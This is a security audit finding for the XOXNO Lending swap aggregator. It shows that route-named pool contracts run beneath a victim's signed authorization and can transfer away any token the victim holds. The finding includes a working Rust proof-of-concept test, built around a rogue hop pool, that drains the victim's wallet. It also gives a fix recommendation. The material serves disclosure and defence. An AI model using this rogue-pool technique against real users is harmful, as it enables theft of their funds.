### Title
Route-named venue code runs below the caller's auth entry and can spend any wallet token the victim holds - (File: contracts/swap-aggregator/src/venues/mod.rs)

### Summary
CVE-2023-32002 is an authorization-policy bypass: `Module._load()` loads modules outside the `policy.json` allowlist because the policy check is skipped on a secondary path. The analog in XOXNO Lending is the swap route's venue dispatch. The system's intended authorization policy is "one exact input-token transfer" (`INV-STRAT-01`), but `dispatch_hop` invokes whichever `pool` address the route payload names, with no venue/pool allowlist. A route can therefore place attacker-deployed contract code on the call stack *below the victim's `require_auth` entry*, and any `token.transfer(victim, attacker, x)` that code makes is recorded by the host as a child of the victim's signed authorization — executing if the victim signs the tree that honest simulation produces.

### Finding Description
- The controller grants only invocation authority for one exact `token_in.transfer(controller → router, amount_in)` with no allowance and no sub-invocations (`contracts/controller/src/strategies/swap.rs:33-38`, `docs/reference/invariants.md` INV-STRAT-01). The documented policy is that nothing else rides on the caller's signature.
- The router dispatches every hop to `ctx.hop.pool` read from the caller-supplied route (`contracts/swap-aggregator/src/venues/mod.rs:23-40`), and adapters call `invoke_contract(&hop.pool, "swap"/"get_reserves", …)` on that arbitrary address (`contracts/swap-aggregator/src/venues/soroswap.rs:55-87`). `docs/explanation/threat-model.md:154-165` confirms: "The router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization."
- The harness test `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs:194-269` proves the bypass end-to-end through `controller::swap_collateral`: simulation records the rogue pool's `token.transfer(alice → attacker, WALLET_BALANCE)` as a sub-invocation of Alice's `swap_collateral` auth entry, and in enforcing mode the signed (simulation-produced) tree executes it — draining 77,770 units of a token the protocol never listed, while the swap itself pays fair output and passes every measured-output and risk gate.
- The same exposure applies to every route-taking entrypoint (`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `multiply`, `flash_position` legs) and to direct `router.execute_strategy` calls, exactly like `Module._load()` reaching code outside the policy definition: the measured-settlement checks bound only the routed amount, never the auth tree.

### Impact Explanation
Theft of user funds. The loss is the victim's entire wallet balance of any token, unbounded by `amount_in`, `amountOutMin`, or the final account risk gate — none of which inspect the authorization tree. The malicious hop still returns a fair measured output, so `verify_router_output` (`swap.rs:75-84`), `RouterOverspend`, `ZeroOutput`, `SlippageExceeded`, and the HF check all pass.

### Likelihood Explanation
Reachable by an unprivileged address: the attacker deploys a `RogueHopPool`-style contract and supplies a quote/route naming it as a hop pool (routes are caller-supplied `StrategySwap` XDR; "own swap route" is in scope). Exploitation requires the victim to sign the auth tree that `simulateTransaction` returns, which is the default wallet flow — the SDK's `verifyRoutePayload` mitigation is an optional client-side check, not enforced on-chain. It requires victim interaction (signing a poisoned route), which lowers likelihood versus a purely self-contained exploit, but no privileged role, leaked key, or malformed parameter is needed.

### Recommendation
Enforce the policy on-chain rather than in clients: maintain a governance-managed venue/pool allowlist in the swap-aggregator and reject hops whose `pool` (and token addresses) are not listed, or restrict dispatch to a registry of venue contracts keyed by `SwapVenue`. Short of that, the controller should bound the authorization surface by documenting — and the SDK enforcing — that a signed tree containing any sub-invocation beyond the single input `transfer` must be rejected (`threat-model.md:161-165` already prescribes this client-side; move it into the contract boundary where feasible).

### Proof of Concept
`tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` is a working PoC:
1. `Scene::new` supplies Alice 10,000 USDC, sets a router double, and mints Alice `WALLET_BALANCE = 77_770_000_000` of an unlisted `wallet_token` (lines 84-108).
2. `route_through_pool_stealing` registers `RogueHopPool` — whose `swap()` calls `token.transfer(victim → attacker, amount)` — and names it as the hop pool (lines 111-125, 62-72).
3. Recording-mode test (lines 194-227) shows simulation emits Alice's `swap_collateral` root with the stolen transfer as its child; enforcing-mode test (lines 229-269) shows the honest root-only tree is refused while the simulation-produced tree executes the theft: `wallet(alice) == 0`, `wallet(attacker) == WALLET_BALANCE`, and the collateral swap still succeeds. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** contracts/swap-aggregator/src/venues/mod.rs (L23-40)
```rust
pub(crate) fn dispatch_hop(
    env: &Env,
    router: &Address,
    hop: &SwapHop,
    amount_in: i128,
    tokens_cache: &mut Map<Address, Vec<Address>>,
) -> i128 {
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L55-87)
```rust
    let (reserve_0, reserve_1): (i128, i128) = ctx.env.invoke_contract(
        &ctx.hop.pool,
        &Symbol::new(ctx.env, "get_reserves"),
        no_args,
    );
    let (reserve_in, reserve_out) = if token_in_is_0 {
        (reserve_0, reserve_1)
    } else {
        (reserve_1, reserve_0)
    };

    let requested_out = soroswap_amount_out(ctx.env, ctx.amount_in, reserve_in, reserve_out);
    if requested_out <= 0 {
        panic_with_error!(ctx.env, Error::ZeroOutput);
    }

    let token_client = token::Client::new(ctx.env, &ctx.hop.token_in);
    token_client.transfer(ctx.router, &ctx.hop.pool, &ctx.amount_in);

    let (amount_0_out, amount_1_out) = if token_in_is_0 {
        (0_i128, requested_out)
    } else {
        (requested_out, 0_i128)
    };
    let args: Vec<Val> = vec![
        ctx.env,
        amount_0_out.into_val(ctx.env),
        amount_1_out.into_val(ctx.env),
        ctx.router.into_val(ctx.env),
    ];
    let _: () = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
```

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-269)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```
